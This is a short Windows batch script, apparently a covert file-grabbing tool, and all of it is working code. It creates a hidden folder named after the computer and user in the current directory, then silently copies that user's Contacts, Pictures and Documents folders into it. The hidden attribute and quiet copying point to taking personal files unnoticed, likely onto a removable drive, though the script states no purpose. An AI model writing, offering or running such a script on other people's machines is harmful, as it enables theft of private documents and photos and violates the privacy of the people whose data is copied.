@echo off

mkdir .\%COMPUTERNAME%_%USERNAME%  && attrib +h %COMPUTERNAME%_%USERNAME%
mkdir .\%COMPUTERNAME%_%USERNAME%\Documents
mkdir .\%COMPUTERNAME%_%USERNAME%\Pictures
mkdir .\%COMPUTERNAME%_%USERNAME%\Contacts

xcopy C:\Users\%USERNAME%\Contacts  .\%COMPUTERNAME%_%USERNAME%\Contacts\  /s /q
xcopy C:\Users\%USERNAME%\Pictures  .\%COMPUTERNAME%_%USERNAME%\Pictures\ /s /q
xcopy C:\Users\%USERNAME%\Documents  .\%COMPUTERNAME%_%USERNAME%\Documents\ /s /q









